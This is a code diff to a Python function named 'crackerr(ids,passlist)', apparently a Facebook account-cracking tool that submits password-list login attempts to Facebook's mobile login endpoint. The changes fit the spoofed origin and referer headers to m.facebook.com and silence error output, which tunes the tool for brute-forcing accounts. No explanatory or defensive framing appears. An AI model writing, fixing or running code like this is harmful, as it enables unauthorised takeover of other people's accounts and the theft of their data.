@@ -477,7 +477,7 @@ def crackerr(ids,passlist):
     }),
 }
             url = "https://m.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=95c2f471fdc717a6b79ae75e26e90a643f5613e03d463667d5b99baf34570f30"
-            headers = {"authority": "www.facebook.com",
+            headers = {"authority": "m.facebook.com",
             "method": "POST",
             "path": "/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100",
             "scheme": "https",
@@ -487,8 +487,8 @@ def crackerr(ids,passlist):
             "cache-control": "max-age=0",
             "content-type": "application/x-www-form-urlencoded",
             "dpr": "3",
-            "origin": "https://www.facebook.com",
-            "referer": "https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1MTM2NjI2LCJjYWxsc2l0ZV9pZCI6MjM5NDQ2MTI0MDg0ODgxN30%3D&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios",
+            "origin": "https://m.facebook.com",
+            "referer": "https://m.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1MTM2NjI2LCJjYWxsc2l0ZV9pZCI6MjM5NDQ2MTI0MDg0ODgxN30%3D&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios",
             "sec-ch-prefers-color-scheme": "light",
             "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
             "sec-ch-ua-full-version-list": "\"Not-A.Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"124.0.6327.4\"",
@@ -537,7 +537,7 @@ def crackerr(ids,passlist):
     except requests.exceptions.ConnectionError:
         time.sleep(20)
     except Exception as e:
-        print(f"\nError: {e}")
+        #print(f"\nError: {e}")
         pass
 
 
